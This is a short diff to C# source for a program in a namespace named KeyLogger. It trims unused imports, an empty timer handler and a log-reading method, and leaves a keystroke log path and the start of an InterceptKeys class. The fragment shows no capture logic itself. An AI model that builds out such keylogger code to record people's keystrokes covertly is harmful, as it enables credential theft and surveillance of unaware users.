@@ -1,28 +1,16 @@
 ﻿using System;
 using System.Diagnostics;
-using System.Timers;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.IO;
 using System.Text;
-using Microsoft.Win32;
 
 namespace KeyLogger
 {
     class appstart
     {
-        public static string str;
-        static ASCIIEncoding encoding = new ASCIIEncoding();
         public static string path = "fileKeyLog.txt";
-        public static byte caps = 0, shift = 0, failed = 0;
-        public static void OnTimedEvent(object source, EventArgs e)
-        {
-        } //end of the OnTimedEvent method
-        public static string strLog()
-        {
-            str = File.ReadAllText(appstart.path, encoding);
-            return str;
-        }
+        public static byte caps = 0, shift = 0;
     }//end of the appstart class
     class InterceptKeys
     {
